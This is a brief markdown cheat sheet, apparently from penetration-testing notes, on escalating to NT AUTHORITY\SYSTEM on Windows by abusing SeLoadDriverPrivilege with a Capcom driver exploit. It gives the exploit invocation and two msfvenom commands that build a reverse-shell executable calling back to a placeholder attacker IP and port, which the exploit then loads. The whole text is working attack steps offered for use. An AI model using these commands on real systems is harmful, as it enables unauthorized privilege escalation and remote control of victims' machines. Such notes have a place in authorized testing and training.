# SeLoadDriverPrivilege

## With GUI

After executing `.\ExpoitCapcom.exe` a cmd as `NT AUTHORITY\SYSTEM` will pop up


## No-GUI version

Executing `.\ExpoitCapcom.exe` will load the Binary `C:\ProgramData\rev.exe`, so you can send yourself a revshell with mfsvenom
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<KALI_PORT> -f exe -o rev.exe
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<KALI_PORT> -f exe -o rev.exe
```
